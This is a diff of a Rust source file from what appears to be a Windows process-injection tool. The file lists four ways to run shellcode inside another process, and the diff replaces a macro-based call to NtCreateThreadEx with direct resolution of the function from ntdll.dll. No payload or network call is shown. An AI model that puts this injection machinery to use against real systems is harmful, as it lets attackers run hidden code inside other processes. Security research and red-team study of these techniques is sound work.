@@ -1,33 +1,47 @@
+use std::ffi::CString;
 use std::thread::sleep;
 use std::{ffi::c_void, ptr};
 
-use dinvk::{data::NtCreateThreadEx, dinvoke};
 use dynasmrt::{dynasm, DynasmApi};
 
-use windows::core::{w, BOOL};
+use windows::core::{w, BOOL, PCSTR};
 use windows::Win32::Foundation::{CloseHandle, HMODULE, HWND, LPARAM, LRESULT, WPARAM};
-use windows::Win32::System::LibraryLoader::LoadLibraryW;
+use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
 use windows::Win32::System::Threading::WaitForSingleObject;
 use windows::Win32::UI::Input::KeyboardAndMouse::VK_SPACE;
 use windows::Win32::UI::WindowsAndMessaging::{EnumWindows, GetWindowThreadProcessId, IsWindowVisible, SendMessageW, SetForegroundWindow, SetWindowsHookExW, UnhookWindowsHookEx, HHOOK, WH_CALLWNDPROC, WM_KEYDOWN, WM_KEYUP, WNDENUMPROC};
 use windows::Win32::{
-    Foundation::HANDLE,
+    Foundation::{HANDLE, NTSTATUS},
     System::{
         LibraryLoader::GetModuleHandleW,
         Threading::{CreateRemoteThread, THREAD_ALL_ACCESS}
     }
 };
-
+use windows::Wdk::Foundation::{OBJECT_ATTRIBUTES};
 use crate::remote_allocator::RemoteAllocator as _;
 use crate::remote_process::RemoteProcess;
 
-#[derive(Debug, Clone)] // todo: clone shouldnt be needed
+#[derive(Debug)]
 pub enum ShellcodeExecution {
     CreateRemoteThread,
     NtCreateThreadEx,
     ThreadHijacking,
     SetWindowsHookEx,
 }
+
+pub type NtCreateThreadEx = unsafe extern "system" fn(
+    thread_handle: *mut *mut c_void,
+    desired_access: u32,
+    object_attributes: *mut OBJECT_ATTRIBUTES,
+    process_handle: *mut c_void,
+    start_routine: *mut c_void,
+    argument: *mut c_void,
+    create_flags: u32,
+    zero_bits: usize,
+    stack_size: usize,
+    maximum_stack_size: usize,
+    attribute_list: *mut c_void,
+) -> NTSTATUS;
 
 pub struct Executor<'a> {
     remote_process: &'a RemoteProcess,
@@ -78,13 +92,16 @@ impl Executor<'_> {
 
     fn execute_nt_create_thread_ex(&self) -> Result<(), Box<dyn std::error::Error>> {
         let ntdll = unsafe { GetModuleHandleW(w!("ntdll.dll"))? };
+        let nt_func_name = CString::new("NtCreateThreadEx")?;
+        let address = unsafe { GetProcAddress(ntdll, PCSTR(nt_func_name.as_ptr() as _)) };
+        if address.is_none() {
+            return Err("NtCreateThreadEx not found".into());
+        }
+        let create_thread_ex_func = unsafe { core::mem::transmute::<*mut core::ffi::c_void, NtCreateThreadEx>(address.unwrap() as *mut _) };
         let mut thread: HANDLE = HANDLE::default();
         let pthread: *mut *mut c_void = &mut thread.0;
 
-        let ntstatus: i32 = dinvoke!(
-            ntdll.0,
-            "NtCreateThreadEx",
-            NtCreateThreadEx,
+        let ntstatus = unsafe { create_thread_ex_func(
             pthread,
             THREAD_ALL_ACCESS.0,
             ptr::null_mut(),
@@ -96,11 +113,10 @@ impl Executor<'_> {
             0,
             0,
             ptr::null_mut()
-        )
-        .ok_or_else(|| "NtCreateThreadEx not found or resolved incorrectly")?;
+        ) };
 
-        if ntstatus != 0 {
-            return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus).into());
+        if ntstatus.0 != 0 {
+            return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus.0).into());
         }
 
         unsafe { WaitForSingleObject(thread, u32::MAX) };
